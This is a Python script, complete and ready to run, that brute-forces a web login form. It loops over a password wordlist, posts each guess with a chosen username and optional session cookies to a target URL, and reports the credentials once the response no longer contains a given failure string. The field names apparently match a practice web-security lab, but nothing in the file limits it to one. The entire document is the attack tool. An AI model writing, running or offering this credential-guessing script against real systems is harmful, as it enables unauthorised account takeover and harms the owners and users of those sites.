import requests
import sys
import os


def cracking(username, url, passwdfile, login_failed_string, cookies=""):
    try:
        # Open the password file
        with open(passwdfile, "r") as passwords:
            for password in passwords:
                password = password.strip()
                print(f"Trying: {password}")
                data = {"username": username, "password": password, "Login": "Login"}
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                }

                # Include cookies if provided
                cookie_dict = {}
                if cookies:
                    cookie_dict = {
                        k: v
                        for k, v in (item.split("=") for item in cookies.split("; "))
                    }

                response = requests.post(
                    url, params=data, headers=headers, cookies=cookie_dict
                )

                # Decode response and check for login failure string
                if login_failed_string.lower() in response.content.decode().lower():
                    continue
                else:
                    print(f"Found username ==> {username}")
                    print(f"Found password ==> {password}")
                    exit(0)
            print("No match found.")
    except FileNotFoundError:
        print(
            f"Error: Password file '{passwdfile}' not found. Please provide a valid file path."
        )
        sys.exit(1)
    except requests.RequestException as e:
        print(f"Error: Unable to make a request to the URL. Details: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)


def main():
    # Ensure the correct number of arguments
    if len(sys.argv) < 5 or len(sys.argv) > 6:
        print(
            "Usage: python script.py <URL> <USERNAME> <PASSWORD_FILE> <LOGIN_FAILED_STRING> [COOKIES]"
        )
        print(
            "Note: Provide cookies as a string in 'key=value; key=value' format if needed."
        )
        sys.exit(1)

    # Parse command-line arguments
    url = sys.argv[1]
    username = sys.argv[2]
    passwdfile = sys.argv[3]
    login_failed_string = sys.argv[4]
    cookies = sys.argv[5] if len(sys.argv) == 6 else ""

    # Validate URL
    if not url.startswith(("http://", "https://")):
        print("Error: Invalid URL. Ensure the URL starts with 'http://' or 'https://'.")
        sys.exit(1)

    # Validate password file
    if not os.path.isfile(passwdfile):
        print(f"Error: Password file '{passwdfile}' does not exist or is not a file.")
        sys.exit(1)

    # Start cracking
    cracking(username, url, passwdfile, login_failed_string, cookies)


if __name__ == "__main__":
    main()
